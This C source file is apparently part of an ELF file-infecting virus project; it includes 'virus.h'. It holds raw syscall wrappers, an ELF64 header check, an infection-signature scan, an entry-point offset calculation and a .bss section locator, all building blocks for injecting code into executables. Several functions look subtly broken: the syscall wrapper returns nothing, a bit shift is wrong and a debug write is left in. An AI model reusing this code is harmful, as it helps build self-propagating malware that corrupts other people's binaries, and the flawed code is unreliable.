#include "virus.h"

unsigned long int ft_syscall(void *arg1, void *arg2, void *arg3, void *arg4, void *arg5) {
    asm (
        "mov rax, %0\n"
        "syscall\n"
        :
        : "m" (arg5)
        : "rax", "rdi", "rsi", "rdx", "rcx"
    );
}

unsigned long int	ft_strlen(const char *str) {
	unsigned long int i;

	i = 0;
	while (str[i] != '\0')
		i++;
	return (i);
}

int	ft_strcmp(const char *s1, const char *s2) {
	int	i = 0;

	while (s1[i] || s2[i])
	{
		if (s1[i] != s2[i])
			return ((unsigned char)s1[i] - (unsigned char)s2[i]);
		i++;
	}
	return (0);
}

int memncat(void *dst, unsigned long int index, void *src, unsigned long int n) {
    unsigned long int i = -1;
    
    while (++i < n)
        ((unsigned char *)dst)[index + i] = ((unsigned char *)src)[i];
    return (0);
}

void	*ft_memset(void *s, int c, unsigned long int n) {
	unsigned long int i;
	unsigned char	*tab;

	tab = (unsigned char *)s;
	i = 0;
	while (i < n) {
		tab[i] = c;
		i++;
	}
	return (s);
}

int check_file(struct ELFheaders64 fHdr) {
    unsigned int ref_bytes = 1179403647;

    if (fHdr.ei_mag0 != ref_bytes)
        return (1);
    else if (fHdr.ei_class != 2)
        return (1);
    else if (fHdr.ei_data != 1)
        return (1);
    else if (fHdr.ei_osabi != 0)
        return (1);
    return (0);
}

unsigned char	ft_strstr(const char *str, const char *need, unsigned long int len)
{
	unsigned long int i;
	unsigned long int j;
    ft_syscall((void *)1, (void *)"this is a test2\n", (void *)16, 0, WRITE);

	i = 0;
	while (i < len) {
		j = 0;
		while ((i + j) < len && (str[i + j] == need[j])) {
			if (need[j + 1] == 0)
				return (1);
			j++;
		}
		i++;
	}
	return (0);
}


int checkSignature(int fd, const char *signature) {
    unsigned long int bytes_rd;
    char buff[0x1000];

    do {
        bytes_rd = ft_syscall((void *)fd, &buff, (void *)0x1000, 0, READ);
        if (ft_strstr(buff, signature, 0x1000) == 1)
            return (1);
    }
    while(bytes_rd > 0);
    return (0);
}


unsigned char isDir(char *path) {
    unsigned char buf[144];
    unsigned int mode;

    if ((int)ft_syscall((void *)path, buf, 0, 0, STAT) != 0)
        return (2);
    mode = ((buf[24 + 0x00] & 0xFF)) | ((buf[24 + 0x01] & 0xFF) << 8) | ((buf[24 + 0x02] & 0xFF) << 24) | ((buf[24 + 0x03] & 0xFF) << 24);
    return (S_ISDIR(mode));
}

int find_offset_nentry_oentry(unsigned long int oep, unsigned long int nep) {
    int offset = 0xFFFFFFFF;
    int diff;

    diff = oep < nep ? (int)(nep - oep) : (int)(oep - nep);
    offset = offset - diff;
    return (offset + 1);
}

int get_section_index(int flags, unsigned int type, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs) {
    int bss_index = -1;

    for (int i = 0; i < fHdr.e_shnum; i++)
        if (sHdrs[i].sh_flags == (SHF_WRITE + SHF_ALLOC) && sHdrs[i].sh_type == SHT_NOBITS)
            bss_index = i;
    return (bss_index);
}